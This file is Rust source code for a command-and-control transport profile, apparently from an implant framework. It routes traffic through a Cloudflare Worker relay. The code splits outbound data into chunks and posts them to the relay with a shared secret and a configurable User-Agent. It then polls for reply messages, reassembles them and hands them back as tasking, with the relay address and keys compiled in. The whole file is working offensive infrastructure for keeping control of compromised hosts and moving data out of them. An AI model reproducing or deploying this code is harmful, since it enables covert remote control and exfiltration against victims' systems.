use crate::profiles::C2Profile;
use rand::Rng;
use std::collections::{HashMap, VecDeque};
use std::error::Error;
use std::time::{Duration, Instant};

use serde_json::json;

const CHUNK_CHARS: usize = 100_000;
const HTTP_TIMEOUT_SECONDS: u64 = 30;
const MAX_TOTAL_PARTS: usize = 100;
const UPLOAD_ATTEMPTS: u32 = 3;
const RETRY_DELAY_SECONDS: u64 = 2;
const POLL_ATTEMPTS: u32 = 20;
const POLL_DELAY_SECONDS: u64 = 3;
const PARTIAL_STALE_LIMIT: Duration = Duration::from_secs(300);
const BUFFERED_REPLIES_LIMIT: usize = 16;

pub struct CloudflareProfile {
    base_url: String,
    secret: String,
    channel_id: String,
    aes_key: Option<Vec<u8>>,
    pending: HashMap<String, PartialReply>,
    buffered_replies: VecDeque<String>,
}

struct PartialReply {
    total: usize,
    parts: Vec<Option<String>>,
    last_seen: Instant,
}

impl CloudflareProfile {
    pub fn new() -> Self {
        Self {
            base_url: profilevars::base_url(),
            secret: profilevars::secret(),
            channel_id: generate_uuid(),
            aes_key: profilevars::aes_key(),
            pending: HashMap::new(),
            buffered_replies: VecDeque::new(),
        }
    }

    fn send_message(&self, data: &str) -> Result<(), Box<dyn Error>> {
        let char_count = data.chars().count();
        if char_count <= CHUNK_CHARS {
            self.upload_part(data, None, 0, 1)?;
            return Ok(());
        }
        let total = (char_count + CHUNK_CHARS - 1) / CHUNK_CHARS;
        if total > MAX_TOTAL_PARTS {
            return Err(format!(
                "message of {} characters needs {} parts but the channel allows {}",
                char_count, total, MAX_TOTAL_PARTS
            )
            .into());
        }
        let msg_id = generate_uuid();
        for (part, chunk) in char_chunks(data, CHUNK_CHARS).into_iter().enumerate() {
            self.upload_part(chunk, Some(&msg_id), part, total)?;
        }
        Ok(())
    }

    fn upload_part(
        &self,
        message: &str,
        msg_id: Option<&str>,
        part: usize,
        total: usize,
    ) -> Result<(), Box<dyn Error>> {
        let envelope = match msg_id {
            None => json!({"id": &self.channel_id, "message": message}),
            Some(id) => json!({
                "id": &self.channel_id,
                "message": message,
                "msg_id": id,
                "part": part,
                "total": total,
            }),
        };
        let mut attempts = 0;
        loop {
            let outcome = minreq::post(format!("{}/upload", self.base_url))
                .with_timeout(HTTP_TIMEOUT_SECONDS)
                .with_header("Content-Type", "application/json")
                .with_header("X-Channel-Secret", &self.secret)
                .with_header("User-Agent", profilevars::useragent())
                .with_body(envelope.to_string())
                .send();
            match outcome {
                Ok(response) if response.status_code == 200 => return Ok(()),
                Ok(response) => {
                    eprintln!(
                        "cloudflare: upload of part {} of {} returned HTTP {}",
                        part, total, response.status_code
                    );
                }
                Err(error) => {
                    eprintln!(
                        "cloudflare: upload of part {} of {} failed: {}",
                        part, total, error
                    );
                }
            }
            attempts += 1;
            if attempts >= UPLOAD_ATTEMPTS {
                return Err(format!(
                    "upload of part {} of {} failed after {} attempts",
                    part, total, attempts
                )
                .into());
            }
            std::thread::sleep(Duration::from_secs(RETRY_DELAY_SECONDS));
        }
    }

    fn poll_once(&mut self) -> Result<(), Box<dyn Error>> {
        let response = minreq::get(format!("{}/poll?id={}", self.base_url, self.channel_id))
            .with_timeout(HTTP_TIMEOUT_SECONDS)
            .with_header("X-Channel-Secret", &self.secret)
            .with_header("User-Agent", profilevars::useragent())
            .send()?;
        if response.status_code != 200 {
            return Err(format!("poll returned HTTP {}", response.status_code).into());
        }
        let body: serde_json::Value = serde_json::from_str(response.as_str()?)?;
        let messages = body
            .get("messages")
            .and_then(|value| value.as_array())
            .ok_or("poll response is missing a messages array")?;
        for message in messages {
            let message_text = message
                .get("message")
                .and_then(|value| value.as_str())
                .ok_or("poll message is missing its message body")?;
            match message.get("part").and_then(|value| value.as_u64()) {
                None => {
                    self.buffered_replies.push_back(message_text.to_string());
                    if self.buffered_replies.len() > BUFFERED_REPLIES_LIMIT {
                        self.buffered_replies.pop_front();
                        eprintln!("cloudflare: dropped the oldest buffered reply, more than {} were outstanding", BUFFERED_REPLIES_LIMIT);
                    }
                }
                Some(part) => {
                    let total = message
                        .get("total")
                        .and_then(|value| value.as_u64())
                        .ok_or("poll message part is missing its total")?;
                    let msg_id = message
                        .get("msg_id")
                        .and_then(|value| value.as_str())
                        .ok_or("poll message part is missing its msg_id")?;
                    self.add_part(
                        msg_id.to_string(),
                        part as usize,
                        total as usize,
                        message_text,
                    );
                }
            }
        }
        self.prune_stale();
        Ok(())
    }

    fn add_part(&mut self, msg_id: String, part: usize, total: usize, message: &str) {
        if total == 0 || total > MAX_TOTAL_PARTS || part >= total {
            eprintln!(
                "cloudflare: dropped an invalid part {} of {} for message set {}",
                part, total, msg_id
            );
            return;
        }
        let part_set = self
            .pending
            .entry(msg_id.clone())
            .or_insert_with(|| PartialReply {
                total,
                parts: vec![None; total],
                last_seen: Instant::now(),
            });
        if part_set.total != total {
            eprintln!(
                "cloudflare: dropped a part {} with a conflicting total {} for message set {}",
                part, total, msg_id
            );
            return;
        }
        part_set.last_seen = Instant::now();
        part_set.parts[part] = Some(message.to_string());
        if part_set.parts.iter().all(|value| value.is_some()) {
            let assembled: String = part_set
                .parts
                .iter()
                .map(|value| value.as_deref().unwrap())
                .collect();
            self.pending.remove(&msg_id);
            self.buffered_replies.push_back(assembled);
            if self.buffered_replies.len() > BUFFERED_REPLIES_LIMIT {
                self.buffered_replies.pop_front();
                eprintln!(
                    "cloudflare: dropped the oldest buffered reply, more than {} were outstanding",
                    BUFFERED_REPLIES_LIMIT
                );
            }
        }
    }

    fn prune_stale(&mut self) {
        self.pending
            .retain(|_, part_set| part_set.last_seen.elapsed() < PARTIAL_STALE_LIMIT);
    }
}

impl C2Profile for CloudflareProfile {
    fn get_aes_key(&self) -> Option<&Vec<u8>> {
        self.aes_key.as_ref()
    }

    fn set_aes_key(&mut self, new_key: Vec<u8>) {
        self.aes_key = Some(new_key);
    }

    fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
        self.send_message(data)?;
        if let Some(reply) = self.buffered_replies.pop_front() {
            return Ok(reply);
        }
        for _ in 0..POLL_ATTEMPTS {
            std::thread::sleep(Duration::from_secs(POLL_DELAY_SECONDS));
            if let Err(error) = self.poll_once() {
                eprintln!("cloudflare: poll attempt failed: {}", error);
            }
            if let Some(reply) = self.buffered_replies.pop_front() {
                return Ok(reply);
            }
        }
        Err(format!(
            "no reply for callback {} within {} seconds",
            self.channel_id,
            (POLL_ATTEMPTS as u64) * POLL_DELAY_SECONDS
        )
        .into())
    }
}

fn char_chunks(data: &str, chunk_chars: usize) -> Vec<&str> {
    let mut chunks = Vec::new();
    let mut boundary = 0;
    let mut chars_since_boundary = 0;
    for (byte_index, character) in data.char_indices() {
        chars_since_boundary += 1;
        if chars_since_boundary == chunk_chars {
            let next_boundary = byte_index + character.len_utf8();
            chunks.push(&data[boundary..next_boundary]);
            boundary = next_boundary;
            chars_since_boundary = 0;
        }
    }
    if boundary < data.len() {
        chunks.push(&data[boundary..]);
    }
    chunks
}

fn generate_uuid() -> String {
    let mut bytes = [0u8; 16];
    rand::thread_rng().fill(&mut bytes);
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;
    let hex: String = bytes.iter().map(|byte| format!("{:02x}", byte)).collect();
    format!(
        "{}-{}-{}-{}-{}",
        &hex[0..8],
        &hex[8..12],
        &hex[12..16],
        &hex[16..20],
        &hex[20..32]
    )
}

pub mod profilevars {
    use serde::{Deserialize, Serialize};
    use std::collections::HashMap;

    #[derive(Deserialize, Serialize)]
    struct Aespsk {
        value: String,
        enc_key: Option<String>,
        dec_key: Option<String>,
    }

    pub fn base_url() -> String {
        let url = env!("worker_base_url");
        String::from(url.trim_end_matches('/'))
    }

    pub fn secret() -> String {
        String::from(env!("worker_secret"))
    }

    pub fn useragent() -> String {
        let headers: HashMap<String, String> = serde_json::from_str(env!("headers")).unwrap();
        headers
            .get("User-Agent")
            .map(|agent| agent.to_owned())
            .unwrap_or_default()
    }

    pub fn aes_key() -> Option<Vec<u8>> {
        let aes: Aespsk = serde_json::from_str(env!("AESPSK")).unwrap();
        aes.enc_key.map(|key| base64::decode(key).unwrap())
    }
}
